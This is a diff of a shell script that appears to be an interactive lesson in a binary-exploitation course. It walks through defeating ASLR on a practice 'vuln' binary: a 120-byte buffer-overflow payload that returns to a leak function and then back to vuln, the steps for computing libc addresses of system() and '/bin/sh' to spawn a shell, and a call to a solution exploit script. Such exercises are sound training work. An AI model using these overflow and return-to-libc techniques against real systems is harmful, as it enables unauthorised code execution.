@@ -1,18 +1,87 @@
 #!/bin/sh
 
-## this will be harder
-## we need a leak from libc or the plt, or GOT or somewhere we can rop to
-## from the easy, it seems like the .text section addresses are constant
-## this means we sould be able to get leak an address on the printf then ret to the read
-cp ../easy/pattern .
-cp ../easy/profile.rr2 .
-cat pattern | strace ./vuln  # "--- SIGBUS {si_signo=SIGBUS, si_code=SI_KERNEL, si_addr=NULL} ---"
+BLUE="\033[1;34m"
+NEUT="\033[0m"
 
-## lets send it to the begining of the function (0x401136)
-perl -e 'print "\x90"x120 . "\x36\x11\x40\x00\x00\x00\x00\x00" ' | strace ./vuln  #  "--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=NULL} ---"
-perl -e 'print "\x90"x120 . "\x36\x11\x40\x00\x00\x00\x00\x00" ' > pattern
-# r2 -A -r profile.rr2 -d vuln
+printf "$BLUE
+This is the same as the last (they're all the same) but we have to turn on aslr
+$NEUT
+../../aslr.sh on"
+read
+../../aslr.sh on
 
-## radare shows this as working
 
+printf "$BLUE
+This will be harder because the addresses of libc are ramdomised
+We need a leak from libc or the plt, or GOT or somewhere we can rop to
+neither system nor any other useful function present in the plt
+Because the .text section addresses are constant we can jump (return) to the leak function
+The leak might tell us the base address of libc or somewhere else useful
+We then jump back to the vuln function and input the base address of libc + the offset to system()
+
+First get the address of leak
+$NEUT
+objdump -d vuln | grep leaker"
+read
+objdump -d vuln | grep leaker
+
+printf "$BLUE
+Then address of vuln
+$NEUT
+objdump -d vuln | grep \"<vuln>\""
+read
+objdump -d vuln | grep "<vuln>"
+
+## hack to get your addressing
+LADDR=`objdump -d vuln | grep leaker | cut -d " " -f1`
+VADDR=`objdump -d vuln | grep "<vuln>" | cut -d " " -f1`
+LBYTES=`python3 -c "
+from pwn import p64
+print(p64(0x$LADDR))
+"`
+VBYTES=`python3 -c "
+from pwn import p64
+print(p64(0x$VADDR))
+"`
+
+printf "$BLUE
+So lets send both and see what happens
+$NEUT
+python2 -c \"print(b'\\\x90'*120 + " 
+python3 -c "print($LBYTES, end='')"
+printf " + "
+python3 -c "print($VBYTES, end='')"
+printf ")\" | ./vuln"
+read
+
+python2 -c "print(b'\x90'*120 + $LBYTES + $VBYTES)" | ./vuln
+
+printf "$BLUE
+We can see that it prints out some kind of address that must have been in rdi
+At this point continuing the exploit in the bash shell becomes extremely difficult
+It remains possible with a colletion of pipes and ipc but we really need to write a program"
+read
+
+printf "
+Let me first walk you through how a program would be constructed, then refer you to the code"
+read
+
+printf "
+First we need to find out the offset between libc and system()/the string \"/bin/sh\" 
+Use radare or gdb or something
+Send the above payload to the target binary
+recv and save the leaked address
+Calculate the real addresses from the leak by adding the offsets
+Create a second payload of the same form as level2
+Send it
+Get a shell"
+read
+
+printf "
+Quit, try write yourself, then checkout the code if you can't
+(the below won't work because our addressing is different, use the addresses retrived above to write your exploit)
+$NEUT
+python3 sol/exploit.py -v"
+read
+python3 sol/exploit.py -v
 
